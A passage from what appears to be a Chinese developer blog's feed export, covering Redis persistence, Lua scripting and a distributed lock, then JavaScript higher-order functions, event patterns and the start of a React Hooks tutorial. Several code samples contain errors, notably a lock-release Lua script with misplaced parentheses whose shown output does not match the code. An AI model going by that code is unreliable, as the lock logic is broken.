AOF 重建的数据跟原数据不一致的问题。” 这句话来自 Redis 实践官方，为了应对这种罕见的 BUG 可以使用 redis-check-aof 命令修复原始的 AOF 文件 1redis-check-aof --fix appendonly-6379.aof # appendonly-6379.aof 对应你的 aof 日志文件 选择 重放优先级：系统重启时优先重放AOF备份数据，随后是RDB,因为从数据备份的完整性考虑，AOF相比RDB可靠性更高些 恢复速度快：RDB采用二进制方式存储占用体积小，AOF是以日志形式存储，体积相比RDB要大，相比较来说，RDB的数据恢复速度要高于AOF 数据安全性：RDB采用快照形式，在一定时间内会丢失数据，AOF相对更安全些，主要有三种策略。 一般来说，应该同时使用两种持久化功能，如果可以承受数分钟以内的数据丢失，可以只使用RDB持久化。很多用户都只使用AOF持久化，而定时生成RDB非常便于进行数据库备份，并且RDB恢复数据集的速度也要比AOF恢复的速度要快，除此之外，使用RDB还可以避免之前说过的AOFbug。 哨兵高可用主从复制如果主节点发生故障，Redis Sentinel功能可以自动提升而不是人工干预 Sentinel是一个分布式系统，类似于Cousul集群，一般由3~5个节点组成，使用Raft算法实现领导者选举因为故障转移只需要一个Sentinel节点来完成 为什么Redis只适用于缓存而不能当做数据库来使用？ 性能：Redis是一个基于内存的数据库，通常用来计数器、Session存储、缓存设计等等 成本：假设百万条数据，仅1%是热点数据其余都是冷数据，这种情况全部都存在Redis里面，是资源的浪费，从缓存设计角度来说，所保存的也仅是热点数据 灵活性：Redis的数据结构是丰富的，支持String,HashTable,List,Set,Zset还有最新的BitMaps.GEO等，如果有很复杂的查询语句，关联查询等，还是SQL等数据库更加合适 数据可靠性：第一种方式是Redis+RDB，如果发生断电，自上次持久化到最次一次故障之间的数据丢失。第二种是Redis+AOF，AOF有三种策略将数据持久化到磁盘，其中everysec是相对折中的一种方案，everysec折中方案也会存在1秒钟数据丢失的问题。 实践1——计数器实现并发场景下的优惠券领取功能计数器在实际中有很多需求：PV/UV、接口并发限制、抽奖、优惠券领取等 业务背景业务需求方做优惠券发放活动，共优惠券10张，参与用户100人，先到先得，假设每次并发20用户同时访问，如何保证不超领取 相关命令 exists：判断指定key是否存在 setnx：设置值，若值存在不做任何处理 incr：计数 每发送一次领取请求，采用incr命令进行自增，由于redis单线程的原因，可以保证原子性，不会出现超领 123456789101112131415161718192021222324252627282930313233343536373839404142434445// luck.jsconst Redis = require('redis');const redis = new Redis(6379,'127.0.0.1');// 将日志写入指定文件const fs = require('fs');const &#123;Console&#125; = require('console');const output = fs.createWriteStream('./stdout.js')const errorOutput fs.createWriteStream('./stderr.js')const logger = new Console(output,errorOutput);async function luck()&#123; const count = 10; const key = 'counter:luck'; const keyExists = await redis.exists(key); if(!keyExists)&#123; // 如果key不存在初始化设置 await redis.setnx(key,0); &#125; // 增加领取数量 const result = await redis.incr(key); if(result &gt; count)&#123; // 优惠券领取超限 logger.error('luck failure',result); return; &#125; logger.info('luck success',result);&#125;module.export = luck;// app.jsconst http = require('http');const luck = require('./luck');http.createServer((req,res)=&gt;&#123; if(req.url === 'luck')&#123; luck(); res.end('ok') &#125;&#125;).listen(3000) 实践2——Redis Lua脚本Lua是一种轻量小巧的脚本语言，用标准c语言编写并以源代码形式开放，设计目的是为嵌入应用程序中，从而为应用程序提供灵活的扩张和定制功能。由于Lua语言具有原子性，其在执行过程中不会被其他程序打断，对于并发下的数据一致性有一定的帮助 两种Lua脚本Redis支持两种运行Lua脚本，一种是直接Redis中输入Lua代码，适用于一些简单的脚本，另一种方式是编写Lua脚本文件，Redis使用SHA1算法支持对脚本签名和Script Load 预先缓存，需要运行的时候通过签名返回的标识符即可。 EVAL通过内置的Lua解释器，可以使用EVAL命令对Lua脚本进行求值 script：指定脚本 numkeys：指定键名餐参数个数 key：键名，可以多个key,通过KEYS[1]KEYS[2]的形式访问 atg：键值，可以多个val，通ARGS[1]ARGS[2]的形式访问 1234567EVAL script numkeys key[key...] arg[arg...]# 通过KEYS[] 数组的形式访问ARGV[],下标是从1开始，KEYS[1]对应的键名为name1,ARGV[2]对应的值为val2127.0.0.1:6379&gt; EVAL "return redis.call('SET',KEYS[1],ARGV[2])" 2 name1 name2 val1 val2OK127.0.0.1:6379&gt; get name1"val2" redis.call何redis.pcall是两个不同的Lua函数来调用redis命令，区别是如果redis命令中出现错误异常，redis.call会直接返回一个错误信息给调用者，而redis.pcall会以Lua的形式对错误进行捕获并返回 123456789# 这里执行了两条 Redis 命令，第一条故意写了一个 SET_ 这是一个错误的命令，可以看到出错后，错误信息被抛出给了调用者，同时你执行 get name2 会得到 (nil)，第二条命令也没有被执行# redis.call127.0.0.1:6379&gt; EVAL "redis.call('SET_', KEYS[1], ARGV[2]); redis.call('SET', KEYS[2], ARGV[3])" 2 name1 name2 val1 val2 val3(error) ERR Error running script (call to f_bf814e38e3d98242ae0c62791fa299f04e757a7d): @user_script:1: @user_script: 1: Unknown Redis command called from Lua script # redis.pcall# 一样的操作，可以看到输出结果为nil，它的错误被Lua捕获了，在执行get name2 会得到一个设置好的结果val3，这里第二条命令是被执行了的EVAL "redis.pcall('SET_', KEYS[1], ARGV[2]); redis.pcall('SET', KEYS[2], ARGV[3])" 2 name1 name2 val1 val2 val3(nil) Nodejs实现1234567891011121314151617// ioredis 支持所有脚本命令，比如EVAL/EVALSHA/SCRIPT,在现实场景中使用它是很繁琐的，要注意脚本缓存，并检测何时使用EVAL、EVALSHA.ioredis公开了一个defineCommand方法，使得脚本更容易使用const Redis = require('ioredis');const redis = new Redis(6379,'127.0.0.1');const evalScript = "return redis.call('SET',KEYS[1],ARGV[2])";redis.defineCommand('evalTest',&#123; numberOfKeys:2, lua:evalScript&#125;);async function eval()&#123; await redis.evalTest('name1','name2','val1','val2'); const result = await redis.get('name1'); console.log(result) // val2&#125;eval(); EVALSHAEVAL命令要求每次执行脚本的时候都发送一次脚本主体script body。Redis有一个内部缓存机制，因此它不会每次都重新编译脚本，通过EVALSHA来实现，根据给定的SHA1校验码，对缓存在服务器中的脚本进行求值 SCRIPT FLUSH：清除所有脚本缓存 SCRIPT EXISTS：检查指定的脚本是否存在于脚本缓存 SCRIPT LOAD：讲一个脚本转入脚本缓存，但不立即运行它 SCRIPT KILL：杀死当前正在运行的脚本 12345678910111213EVALSHA sha1 numkeys key [key...] arg[arg...]# 载入脚本缓存127.0.0.1:6379&gt; SCRIPT LOAD "redis.pcall('SET',KEYS[1],ARGV[2])""3b2c59b4e98a20a3a9e631fb586218e7b70f1020"# 生成的SHA-1签名的标识字符串用于执行之后的脚本127.0.0.1:6379&gt; EVALSHA 3b2c59b4e98a20a3a9e631fb586218e7b70f1020 2 name11 name12 val11 val12(nil)127.0.0.1:6379&gt; get name11"val12" nodejs实现1234567891011121314151617const Redis = require('ioredis');const redis = new Redis(6379,'127.0.0.1');const evalScript = "return redis.call('SET'，KEY1[1],ARGV[2])";async function evalSHA()&#123; // 1.缓存脚本获取sha1值 const sha1 = await redis.script('load',evalScript); // 2.通过evalsha执行脚本 await redis.evalsha(sha1,2,'name1','name2','val1','val2'); // 3.获取数据 const result = await redis.get('name1'); console.log(result); // val2&#125;evalSHA(); Lua脚本文件有逻辑运算的脚本，可以编写Lua脚本文件 下面是一个测试代码，通过读取两个值比较返回不同的值，通过lua脚本实现后可以多条redis命令原子性 1234567891011121314---test.lua-- 先SETredis.call('SET',KEYS[1],ARGV[1])redis.call('SET',KEYS[2],ARGV[2])-- GET 取值local key1 = tonumber(redis.call('GET',KEYS[1]));local key2 = tonumber(redis.call('GET',KEYS[2]));-- 如果key1 小于 key2返回0 nil相当于falseif(key1 == nil or key == nil or key1 &lt; key2) then return 0 else return 1 end nodejs加载lua脚本文件123456789101112const Redis = require('ioredis');const redis = new Redis(6379,'127.0.0.1')const fs = require('fs')async function test()&#123; const redisLuaScript = fs.readFileSync('./test.lua'); const result1 = await redis.eval(redisLuaScript,2,'name1','nam2',20,10); const result2 = await redis.eval(redisLuaScript,2,'name1','nam2',10,20); console.log(result1,result2); // 1 0&#125;test(); 实践3——Redis分布式锁线程锁：单线程编程模式下请求是顺序的，一个好处不需要考虑线程安全、资源竞争问题 进程锁：一个服务部署于一台服务器，同时开启多个进程，nodejs中为了利用操作系统资源，根据CPU的核心数可以开启多程模式，这个时候如果对于一个共享资源操作还是会遇到资源竞争的问题，另外每一个进程都是相互独立，拥有自己独立的内存空间，关于进程锁通过java的synchronized也很难解决，它仅局限在同一个JVM中有效 分布式锁：一个服务无论是单线程还是多进程模式，当多机部署、处于分布式环境下对统一共享资源进行操作还是会面临同样的问题。由于先读数据在通过业务逻辑修改之后进行SET操作，这并不是一个原子操作，当多个客户端对同一个资源进行先读后写操作就会引发并发问题，这个时候就需要分布式锁去解决。 实现思路实现分布式锁的方式：数据库、redis、zookeeper，通过redis来实现一个分布式锁，保持三个特性：安全性、死锁、容错 安全性：上锁，在任意时刻保持仅有一个客户端持有该锁 死锁：造成死锁可能是由于某种原因，本该释放的锁没有被释放，因此在上锁的时候可以同步设置过期时间，由于客户端自己的原因没有被释放，也要保证锁能够自动释放 容错：容错是在多节点的模式下需要考虑的，只要保证N/2+1节点可用，客户端就可以成功获取、释放锁 Redis但实力分布式锁实现在Redis的单节点实例下实现一个简单的分布式锁，会借助简单lua脚本来实现原子性 上锁通过setnx命令占坑，为了防止死锁，通常在占坑之后还会设置一个过期时间expire: 12setnx key valueexpire key seconds 上面的操作不是一个原子性操作，原子性操作是指命令在执行过程中并不会被其他线程或者请求打断，如果setnx执行成功之后，出现网络闪断expire命令便不会得到执行，会导致死锁出现。 通过： 1set key value [EX seconds] [PX milliseconds] [NX|XX] 释放锁释放锁的过程是将原来占有的坑删除，加锁的过程把value设置为一个随机值，在del key之前先判断这个key存在且value等于自己制定的值才执行删除操作，判断和删除不是一个原子性操作，借助Lua脚本实现 12345if redis.call("get",KEYS[1]) == ARGV[1] then return redis.call("del",KEYS[1])else return 0end Node实践初始化自定义redisLock123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687class RedisLock &#123; /** * 初始化 RedisLock * @param &#123;*&#125; client * @param &#123;*&#125; option */ constructor(client, options = &#123;&#125;) &#123; if (!client) &#123; throw new Error('client 不存在') &#125; if (client.status !== 'connecting') &#123; throw new Error('client 未正常链接') &#125; this.lockLeaseTime = options.lockLeaseTime || 2; // 默认所过期时间 2 秒 this.lockTimeout = options.lockTimeout || 5; // 默认所过期时间 5 秒 this.expireMode = options.expireMode || 'EX'; this.setMode = options.setMode || 'NX'; this.client = client; &#125; /** * 上锁，通过set 命令传入setnx/expire拓展参数， * 上锁成功返回，上锁失败进行重试， * 在lockTimeout 指定时间内仍未获取到锁，则获取锁失败 * @param &#123;*&#125; key * @param &#123;*&#125; val * @param &#123;*&#125; expire */ async lock(key, val, expire) &#123; const start = Date.now(); const self = this; return (async function intraneLock() &#123; try &#123; const result = await self.client.set(key, val, self.expireMode, expire || self.lockLeaseTime, self.setMode); // 上锁成功 if (result === 'OK') &#123; console.log(`$&#123;key&#125; $&#123;val&#125; 上锁成功`); return true; &#125; // 锁超时 if (Math.floor((Date.now() - start) / 1000) &gt; self.lockLeaseTime) &#123; console.log(`$&#123;key&#125; $&#123;val&#125; 上锁重试超时结束`) return false; &#125; // 循环等待重试 console.log(`$&#123;key&#125; $&#123;val&#125; 等待重试`) await sleep(3000); console.log(`$&#123;key&#125; $&#123;val&#125; 开始重试`) return intraneLock(); &#125; catch (err) &#123; throw new Error(err); &#125; &#125;)(); &#125; /** * 释放锁,通过redis.eval(script)执行自定义redis lua脚本 * @param &#123;*&#125; key * @param &#123;*&#125; val */ async unLock(key, val) &#123; const self = this; const script = ` if redis.call('get',KEYS[1] == ARGV[1]) then return redis.call('del',KEYS[1]) else return 0 end `; try &#123; const result = await self.client.eval(script, 1, key, val); if (result === 1) &#123; return true; &#125; return false; &#125; catch (err) &#123; throw new Error(err); &#125; &#125;&#125; 测试123456789101112131415161718192021222324252627282930const Redis = require('ioredis');const redis = new Redis(6379, '127.0.0.1');const uuidv1 = require('uuid/v1');const RedisLock = require('./redisLock');const redisLock = new RedisLock(redis);function sleep(time) &#123; return new Promise((resolve) =&gt; &#123; setTimeout(function () &#123; resolve(); &#125;, time || 1000) &#125;)&#125;async function test(key) &#123; try &#123; const id = uuidv1(); await redisLock.lock(key, id, 20); await sleep(3000); const unLock = await redisLock.unLock(key, id); console.log('unLock: ', key, id, unlock); &#125; catch (err) &#123; console.log('上锁失败', err); &#125;&#125;test('name1');test('name1') 同时调用了两次test方法进行上锁，只有第一次是成功的，第二次name1 上锁的时候发现key=name1已被占坑，开始重试，由于以上的测试中设置了3秒之后自动释放，name1 在经过两次重试之后上锁成功 12345678name1 26e00260-0532-11ea-b978-2160dffafa30 上锁成功name1 26e02970-0532-11ea-b978-2160dffafa30 等待重试name1 26e02970-0532-11ea-b978-2160dffafa30 开始重试name1 26e02970-0532-11ea-b978-2160dffafa30 等待重试unLock: name1 26e00260-0532-11ea-b978-2160dffafa30 truename1 26e02970-0532-11ea-b978-2160dffafa30 开始重试name1 26e02970-0532-11ea-b978-2160dffafa30 上锁成功unLock: name1 26e02970-0532-11ea-b978-2160dffafa30 true Redlock算法在Sentinel/Redis Cluster下，如果客户端A在主节点获取到锁之后，主节点还未来得及同步信息到从节点就挂掉了，这时候Sentinel 会选举另外一个从节点作为主节点，那么客户端B此时也申请相同的锁，就会出现同一个锁被多个客户端持有，对数据的最终一致性有很高的要求还不行。 鉴于这些问题，官方提供了一个使用Redis实现分布式锁的规范算法Redlock，在单实例或者多实例提供强有力的保障，本身具备容错能力，会从N个实例使用相同的key、随机值尝试set ket value [EX seconds] [PX milliseconds] [NX|XX]命令去获取所，在有效时间内至少 N/2+1个Redis实例取到所，否则取锁失败，失败情况下客户端应该在所有Redis实例上进行解锁 123456789101112131415161718192021222324252627const Redis = require('ioredis');const client1 = new Redis(6379, '127.0.0.1');const RedLock = require('redlock');const redlock = new RedLock([client1], &#123; retryDelay: 200, // time in ms retryCount: 5&#125;)// 多个Redis 实例// const redlock = new RedLock(// [new Redis(6379, '127.0.0.1')],// [new Redis(6379, '127.0.0.2')],// [new Redis(6379, '127.0.0.3')]// )async function test(key, ttl, client) &#123; try &#123; const loclk = await redlock.lock(key, ttl); console.log(client, lock, value) &#125; catch (err) &#123; console.log(client, err); &#125;&#125;test('name1', 10000, 'client1');test('name1', 10000, 'client2'); 对同一个key name1 两次上锁，由于client1 先取到了锁，client2 无法获取锁，重试5次之后报错：LockError:Exceeded 5 attempts to lock the resource &#39;name1&#39; 如何让秒杀、活动倒计时更加精确分析一下从获取服务器时间到前端显示倒计时的过程： 客户端http请求服务器时间 服务器响应完成 服务器通过网络传输时间到客户端 客户端根据活动开始时间和服务器时间差做倒计时显示 服务器响应完成的时间就是服务器时间，但是经过网络传输就会有误差，由网络环境决定误差大小，一般是几十ms或者几百ms。 可得出：当前服务器时间=服务器系统返回时间+网络传输时间+前端渲染时间+常量（可选） 前端渲染时间，避免不同浏览器渲染快慢差异差异造成明显的时间不同步，可以在服务器返回当前时间和本地签单的时间的差值得出 获得服务器时间后，前端进入倒计时计算和计时器显示，要考虑js代码和线程阻塞造成计时器延时问题，思路是通过引入计数器，判断计时器延迟执行的时间来调整，尽量让误差缩小，不同浏览器不同时间段打开页面倒计时误差可控制在1s以内 1234567891011121314151617181920212223242526272829303132// 线程占用setInterval(()=&gt;&#123; var j = 0; while(j++ &lt; 100000000);&#125;,0)// 倒计时let interval = 1000, ms = 50000, //从服务器和活动开始时间计算出的时间差，测试用50000ms count=0, startTime = new Date().getTime(), timeCounter = null;if(ms &gt;=0)&#123; timeCounter = setTimeout(countDownStart,interval)&#125;function countDownStart()&#123; count++; const offset = new Date().getTime() - (startTime+count*interval); let nextTime = interval -offset; const daytohour = 0; if(nextTime &lt; 0)&#123; nextTime = 0; &#125; ms-=interval; console.log(`误差：$&#123;offset&#125;ms,下一次执行：$&#123;nextTime&#125;ms后，离活动结束还有：$&#123;ms&#125;ms`) if(ms &lt; 0)&#123; clearTimer(timeCount) &#125;else&#123; timeCounter = setTimeout(countDownStart,nextTime), &#125;&#125;]]></content>
      <categories>
        <category>NodeJs</category>
      </categories>
      <tags>
        <tag>NodeJs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[珠峰架构-函数]]></title>
    <url>%2F2019-12-07-%E7%8F%A0%E5%B3%B0%E6%9E%B6%E6%9E%84-Day1.html</url>
    <content type="text"><![CDATA[珠峰架构-函数知识点： 高阶函数，解决异步问题、发布订阅模式和观察者模式、promise核心应用，promise解决异步问题、实现一个完成的promise库、promise中常见的面试题、扩展promise中常见的方法、掌握 generator的使用以及co库的应用、异步方案 async+await 高阶函数AOP 面向切片编程1234567891011121314151617181920212223242526272829303132333435363738// 高阶函数 函数参数如果是函数，或者这个函数返回一个新的函数，我们就叫它高阶函数// AOP 面向切片编程// before函数function say(who) &#123; console.log(who + ' hello')&#125;Function.prototype.before = function (beforeFn) &#123; return (...args) =&gt; &#123; beforeFn(); this(...args); &#125;&#125;Function.prototype.after = function (afterFn) &#123; return (...args) =&gt; &#123; this(...args); afterFn(); &#125;&#125;let beforeSay = say.before(() =&gt; &#123; console.log('开始说话')&#125;)let afterSay = beforeSay.after(() =&gt; &#123; console.log('结束说话')&#125;)afterSay('laibh.top');/**开始说话laibh.top hello结束说话*/ React事务简单模拟123456789101112131415161718192021222324252627282930313233343536373839class Transaction &#123; perform(anyMethod, wrappers) &#123; wrappers.forEach(wrapper =&gt; wrapper.initialize()) anyMethod(); wrappers.forEach(wrapper =&gt; wrapper.close()) &#125;&#125;let transaction = new Transaction()let oldFunc = () =&gt; &#123; console.log('原有的逻辑')&#125;transaction.perform(oldFunc, [ &#123; // wrapper1 initialize() &#123; console.log('初始化1') &#125;, close() &#123; console.log('关闭1') &#125; &#125;, &#123; // wrapper2 initialize() &#123; console.log('初始化2') &#125;, close() &#123; console.log('关闭2') &#125; &#125;])/**初始化1初始化2原有的逻辑关闭1关闭2*/ 判断类型1234567891011121314151617// 判断数据类型// typeof instaceof constructor Object.prototype.toString.callfunction isType(type) &#123; return (args) =&gt; Object.prototype.toString.call(args) === `[object $&#123;type&#125;]`&#125;const types = ['String', 'Boolean', 'Number', 'Null', 'Undefined', 'Symbol', 'Object']const utils = &#123;&#125;for (let i = 0; i &lt; types.length; i++) &#123; let type = types[i] utils[`is$&#123;type&#125;`] = isType(type)&#125;console.log(utils.isSymbol(Symbol())) 异步并发 lodash after1234567891011121314151617181920212223242526272829303132333435363738394041424344// lodash after 在执行多少次之后// 做异步的并发处理function after(times, callback) &#123; return () =&gt; &#123; if (--times == 0) &#123; callback(); &#125; &#125;&#125;let fn = after(3, () =&gt; &#123; console.log('执行三次后才执行')&#125;)fn()fn()fn()// node 方法异步的 I/Olet fs = require('fs')const after = (times, callback) =&gt; &#123; let website = &#123;&#125; return (key, value) =&gt; &#123; website[key] = value if (--times === 0) &#123; callback(website) &#125; &#125;&#125;const out = after(2, (website) =&gt; &#123; console.log(website)&#125;)fs.readFile('./name.txt', 'utf8', (err, data) =&gt; &#123; out('name', data)&#125;);fs.readFile('./age.txt', 'utf8', (err, data) =&gt; &#123; out('age', data)&#125;); 发布订阅模式和观察者模式发布订阅解决异步123456789101112131415161718192021222324252627282930313233343536373839// node 方法异步的 I/Olet fs = require('fs')// 希望两次都完成后，分别打印最终结果，再打印一次已经处理完毕的// 发布emit 订阅 on 一种一对多的关系 [fn,fn,fn]class Events &#123; constructor() &#123; this.stack = [] &#125; on(callback) &#123; this.stack.push(callback) &#125; emit() &#123; this.stack.forEach(callback =&gt; callback()) &#125;&#125;let events = new Events();let website = &#123;&#125;;events.on(() =&gt; &#123; if (Object.keys(website).length === 2) &#123; console.log(website) &#125; console.log('当前获取完毕')&#125;)fs.readFile('./name.txt', 'utf8', (err, data) =&gt; &#123; website.name = data events.emit();&#125;);fs.readFile('./age.txt', 'utf8', (err, data) =&gt; &#123; website.age = data events.emit();&#125;); 观察者模式简单模拟12345678910111213141516171819202122232425262728293031// 观察者模式class Subject &#123; // 被观察者 constructor() &#123; this.stack = []; this.state = 'happy' &#125; attach(observer) &#123; this.stack.push(observer) &#125; setState(newState) &#123; this.state = newState this.stack.forEach(p =&gt; p.update(newState)) &#125;&#125;class Observer &#123; // 观察者 constructor(name) &#123; this.name = name &#125; update(newState) &#123; console.log(`$&#123;this.name&#125;,小宝宝$&#123;newState&#125;`) &#125;&#125;let p1 = new Observer('爸爸')let p2 = new Observer('妈妈')let c = new Subject('小宝宝')c.attach(p1)c.attach(p2)c.setState('unhappy') Promise]]></content>
      <categories>
        <category>珠峰架构</category>
      </categories>
      <tags>
        <tag>珠峰架构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react hook实践]]></title>
    <url>%2F2019-10-26-react%20hook%E5%AE%9E%E8%B7%B5.html</url>
    <content type="text"><![CDATA[react hook实践又到了跟着文档码字学习的阶段，hook从提案到现在已经很久了。在这之前但是还没有真正地去了解这个 react 新玩具。跟随文档学习，并尝试重构一些项目 简介官方自带的视频已经很好地介绍了 hook 概览Hook 是 React.16.8 新增特征，可以让你在不编写 class的情况下使用 state 以及其他 React 特性 State Hook简单的示例： 12345678910111213import React,&#123;useState&#125; from 'react'function Example()&#123; const [count,setCount] = useState(0) return( &lt;div&gt; &lt;p&gt;You clicked &#123;count&#125; times&lt;/p&gt; &lt;button onClick=&#123;()=&gt;setCount(count+1)&#125;&gt; Click me &lt;/button&gt; &lt;/div&gt; )&#125; 通过在函数组件里调用它来给组件添加一些内部的 state，React 会在渲染的时候保留这个 state。useState会返回一堆值：当前值和一个让你更新它的函数，可以在时间处理函数中或者其他一些地方调用这个函数。类似 class组件的 this.setState，但是它不会把新的 state和旧的 state进行合并。 useState 唯一的参数就是初始的state。上面的例子中，计数器从零开始的，所有初始 state就是0。注意不同于 this.state，这里的 state不一定要是一个对象。 声明多个变量在一个组件中声明多个变量 12345function ExampleWithManyStates()&#123; const [age,setAge] = useState(42) const [fruit,setFruit] = useState('banana') const [todos,setTodos] = useState(&#123;text:'Learn Hooks'&#125;)&#125; Hook?Hook 是一些可以让你在函数组件里 钩入 React state以及生命周期函数等特性的函数。Hook 不能在 class 组件中使用。使得不用 class 也可以使用 React. Effect HookReact 组件中数据获取、订阅或者手动修改 DOM,都统称为副作用，或者称为作用 useEffect就是 Effect Hook，给函数组件增加了操作副作用的能力，跟 class 组件的 componentDid、componentDidUpdate、componentWillUnmount具有相同的用途，只不过被合并成了一个AOU 例子，在 React 更新 DOM 后设置一个页面的标题 123456789101112131415161718import React, &#123; useState, useEffect &#125; from 'react'function Example()&#123; const [count, setCount] = useState(0) // 相当于 componentDidMount 和 componentDidUpdate useEffect(()=&gt;&#123; document.title = `laibh.top you check $&#123;count&#125; times` &#125;) return( &lt;div&gt; &lt;p&gt;You click &#123;count&#125; times&lt;/p&gt; &lt;button onClick=&#123;()=&gt;setCount(count+1)&#125;&gt; Click me &lt;/button&gt; &lt;/div&gt; )&#125; 当调用 useEffect，就是在告诉 React 在完成对 DOM 的更改后运行副作用函数，由于副作用函数是在组件内声明的，所有可以访问到组件的 props或者 state。默认情况下，React 会在每次渲染后调用副作用函数——包括第一次渲染的时候 副作用函数还可以通过返回一个函数来指定清除副作用。例如，在下面的组件中使用副作用函数来订阅好友的在线状态，并通过取消订阅来进行清除操作： 123456789101112131415161718import React,&#123;useState,useEffect&#125; from 'react'function FriendStatus(props)&#123; const [isOnline,setIsOnline] = useState(null) function handleStatusChange(status)&#123; setIsOnline(status.isOnline) &#125; useEffect(()=&gt;&#123; ChatAPI.subscribeToFrinedStatus(props.friend.id,handleStatusChange) return()=&gt;&#123; ChatAPI.unsubscribeFromFriendStatus(props.friend.id,handleStatusChange) &#125; &#125;) if(isOnline === null)&#123; return 'Loading ...' &#125; return isOnline ? 'Online' : 'Offline'&#125; 上面的实例中，React会在组件销毁或者后续渲染时重新执行副作用函数，取消对 ChatAPI的订阅。 跟 useState一样，可以在组件中多次使用 useEffect 12345678910111213141516function FriendStatusWithCounter(props)&#123; const [count,setCount] = useState(0) useEffect(()=&gt;&#123; document.title = `You clicked $&#123;count&#125; times` &#125;) const [isOnline,setIsOnline] = useState(null) useEffect(()=&gt;&#123; ChatAPI.subscribeToFriendStatus(props.friend.id,handleStatusChange) return()=&gt;&#123; ChatAPI.subscribeFromFriendStatus(props.friend.id,handleStatusChange) &#125; &#125;) function handleStatusChange(status)&#123; setIsOnline(status.isOnline) &#125;&#125; 通过使用 Hook,可以把组件内相关的副作用组织在一起（例如创建订阅以及及时取消），而不要把它们拆分到不同的生命周期函数 Hook使用规则Hook 就是 javascript 函数，但是使用它们会有两个额外的规则： 只能在函数最外层调用Hook。不要在循环、条件判断或者子函数中调用 只能在React 的函数组件中调用Hook。 自定义 Hook在之前，组件之间复用一些状态逻辑，有两种主流方案：高阶组件、render props。自定义 Hook可以在不增加组件的情况下达到相同的目的 FriendStatus组件，通过调用 useState和 useEffect的 Hook 来订阅一个好友的在线状态，假设我们想在另一个组件里复用这个订阅逻辑 首先，把逻辑提取到一个叫做 useFriendStatus的自定义 Hook里： 12345678910111213141516import React,&#123;useState,useEffect&#125; from 'react'function useFriendStatus(friendID)&#123; const [isOnline,setIsOnline] = useState(null) function handleStatusChange(status)&#123; setIsOnline(status.isOnline) &#125; useEffect(()=&gt;&#123; ChatAPI.subscribeToFriendStatus(friendID,handleStatusChange) return()=&gt;&#123; ChatAPI.unsubscribeFromFriendStatus(friendID,handleStatusChange) &#125; &#125;) return isOnline&#125; 它将 friendID作为参数，并返回该好友是否在线，我们可以在两个组件中用到它： 12345678910111213141516function FriendStatus(props)&#123; const isOnline = useFriendStatus(props.friend.id) if(isOnline === null)&#123; return 'Loading' &#125; return isOnline ? 'Online' : 'Offline';&#125;function FriendListItem(props)&#123; const isOnlie = useFriendStatus(props.friend.id) return( &lt;li style=&#123;&#123;color:isOnline?'green':'black'&#125;&#125;&gt; &#123;props.friend.name&#125; &lt;/li&gt; )&#125; 两个组件中的 state 是完全独立的。Hook 是一种复用状态逻辑的方式，不复用 state 本身，事实上，Hook 每次调用都有一个完全独立的 state,因此可以在单个组件中多次调用同一个自定义 Hook 其他Hook还有一些使用频率较低的但很有用的 Hook，比如使用 useContext可以不使用组件嵌套订阅 React 的 Context 123456789function Example()&#123; const locale = useContext(localeContext) const theme = useContext(ThemeContext) // ..&#125;// useReducer 通过 reducer 来管理组件本地复杂的 statefunction Todos()&#123; const [todos,dispatch] = useReducer(todosReducer)&#125; 使用 State Hook12345678910111213141516171819202122232425262728293031323334// class 示例class Example extends React.Component&#123; constructor(props)&#123; super(props) // 1. 构造函数中设置来初始化 count this.state = &#123; count:0 &#125; &#125; render()&#123; return( &lt;div&gt; &lt;p&gt;You click &#123;this.state.count&#125; times&lt;/p&gt; &lt;button onClick=&#123;()=&gt;this.setState(&#123;count:this.state.count+1&#125;)&#125;&gt; Click me &lt;/button&gt; &lt;/div&gt; ) &#125;&#125;// hook示例import React,&#123;useState&#125; from 'react'function Example()&#123; // 1. 函数组件中没有this,不能分配或者读取this.state,直接调用 useState // 2. useState定义了一个 state变量。需要为一个参数初始state，参数可以是数字字符串或者对象。返回值为当前state以及更新state的函数。 const [count,setCount] = useState(0) return( &lt;div&gt; &lt;p&gt;You click &#123;count&#125; times&lt;/p&gt; &lt;button onClick=&#123;()=&gt;setCount(count+1)&#125;&gt;&lt;/button&gt; &lt;/div&gt; )&#125; Hook和函数组件12345678const Example = (props)=&gt;&#123; // 在这里可以使用 Hook return &lt;div /&gt; &#125;function Example(props)&#123; // 这里可以使用 Hook return &lt;div /&gt;&#125; Hook 在 class 内部是不起作用的，可以使用来替代 class 使用 Effect HookEffect Hook可以让你在函数组件中执行副作用操作 123456789101112131415161718import React,&#123;useState,useEffect&#125; from 'react'function Example()&#123; const [count,setCount] = useState(0) // 类似于 componentDidMount 和 componentDidUpdate、componentWillUnmount useEffect(()=&gt;&#123; // 用浏览器的api更新文档标题 document.title = `You clicked $&#123;count&#125; times` &#125;) return( &lt;div&gt; &lt;p&gt;You clicked &#123;count&#125; times&lt;/p&gt; &lt;button onClick=&#123;()=&gt;setCount(count+1)&#125;&gt; Click me &lt;/button&gt; &lt;/div&gt; )&#125; 数据获取，设置订阅以及手动更改 React 组件中的 DOM 都属于副作用。在 React 组件中有两种常见副作用操作：需要清除的和不需要清除的。 无需清除的 effect有时候，我们只想在 React 更新DOM 之后运行一些额外的代码，比如网络请求、手动变更 DOM,记录日志，这些都是常见的无需清除的操作。因为我们在执行完这些操作之后，就可以忽略他们了。 使用class在 React 的 class 组件中，render函数是不应该有任何副作用的，一般来说，在这里执行操作太早了，我们都希望在 React 更新 DOM 之后才执行我们的操作 这也是为什么把副作用放在 componentDidMount和componentDidUpdate函数中。 下面的示例，React 计数器的 class 组件，在 React 对 DOM 进行操作后，立即更新了 document 的 title 属性 12345678910111213141516171819202122232425262728class Example extends React.Component&#123; constructor(props)&#123; super(props) this.state = &#123; count:0 &#125; &#125; componentDidMount()&#123; document.title = `You clicked $&#123;this.state.count&#125; times` &#125; componentDidUpdate()&#123; document.title = `You clicked $&#123;this.state.count&#125; times` &#125; render()&#123; return( &lt;div&gt; &lt;p&gt;You clicked &#123;this.state.count&#125; times&lt;/p&gt; &lt;button onClick=&#123;()=&gt;this.setState(&#123;count:this.state.count+1&#125;)&#125;&gt; Click me &lt;/button&gt; &lt;/div&gt; ) &#125;&#125;// 在 class 中，我们需要在两个声明周期函数中编写重复代码，很多情况下，我们希望在组件加载和更新时执行同样的操作。从概念上，我们希望每次渲染后执行-但是React的class组件没有提供这样的方法，即使我们提取出来，还是要在两个地方调用它 使用hook123456789101112131415161718192021import React,&#123;useState,useEffect&#125; from 